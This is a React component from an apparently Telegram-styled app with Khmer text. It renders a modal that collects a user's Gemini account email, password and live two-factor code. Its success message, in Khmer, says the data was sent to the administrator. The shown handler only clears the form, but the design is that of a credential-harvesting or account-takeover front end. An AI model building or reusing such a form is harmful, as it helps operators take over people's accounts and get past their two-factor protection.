import { useState } from "react";
import { TelegramModal } from "../TelegramModal";
import { TelegramButton } from "../TelegramButton";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { AlertTriangle, Sparkles } from "lucide-react";
import { km } from "@/utils/khmer";

interface GeminiModalProps {
  isOpen: boolean;
  onClose: () => void;
}

export function GeminiModal({ isOpen, onClose }: GeminiModalProps) {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [twoFactorCode, setTwoFactorCode] = useState("");
  const [submitted, setSubmitted] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setSubmitted(true);
    setTimeout(() => {
      setSubmitted(false);
      setEmail("");
      setPassword("");
      setTwoFactorCode("");
      onClose();
    }, 2000);
  };

  return (
    <TelegramModal
      isOpen={isOpen}
      onClose={onClose}
      title={km.enterGeminiAccount}
    >
      {submitted ? (
        <div className="text-center py-6">
          <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-[#2ecc71]/20 flex items-center justify-center">
            <Sparkles className="w-8 h-8 text-[#2ecc71]" />
          </div>
          <p className="text-white text-lg font-medium">{km.success}</p>
          <p className="text-[#8a9bb0] text-sm mt-1">
            ទិន្នន័យបានបញ្ជូនទៅកាន់អ្នកគ្រប់គ្រង
          </p>
        </div>
      ) : (
        <form onSubmit={handleSubmit} className="space-y-4">
          <div className="space-y-2">
            <Label htmlFor="gemini-email" className="text-[#8a9bb0]">
              {km.email}
            </Label>
            <Input
              id="gemini-email"
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="bg-[#2b3a4a] border-[#2b3a4a] text-white placeholder:text-[#5a6a7a] focus:border-[#3390ec] focus:ring-[#3390ec]"
              placeholder="example@email.com"
              required
            />
          </div>

          <div className="space-y-2">
            <Label htmlFor="gemini-password" className="text-[#8a9bb0]">
              {km.password}
            </Label>
            <Input
              id="gemini-password"
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="bg-[#2b3a4a] border-[#2b3a4a] text-white placeholder:text-[#5a6a7a] focus:border-[#3390ec] focus:ring-[#3390ec]"
              placeholder="••••••••"
              required
            />
          </div>

          <div className="space-y-2">
            <Label htmlFor="gemini-2fa" className="text-[#8a9bb0]">
              {km.twoFactorCode}
            </Label>
            <Input
              id="gemini-2fa"
              type="text"
              value={twoFactorCode}
              onChange={(e) => setTwoFactorCode(e.target.value)}
              className="bg-[#2b3a4a] border-[#2b3a4a] text-white placeholder:text-[#5a6a7a] focus:border-[#3390ec] focus:ring-[#3390ec]"
              placeholder="123456"
              required
            />
          </div>

          {/* Warning */}
          <div className="flex items-start gap-2 p-3 rounded-lg bg-[#e74c3c]/10 border border-[#e74c3c]/20">
            <AlertTriangle className="w-5 h-5 text-[#e74c3c] flex-shrink-0 mt-0.5" />
            <p className="text-sm text-[#e74c3c]">{km.passwordWarning}</p>
          </div>

          <TelegramButton
            variant="primary"
            type="submit"
            icon={<Sparkles className="w-5 h-5" />}
            className="w-full"
          >
            {km.submit}
          </TelegramButton>
        </form>
      )}
    </TelegramModal>
  );
}
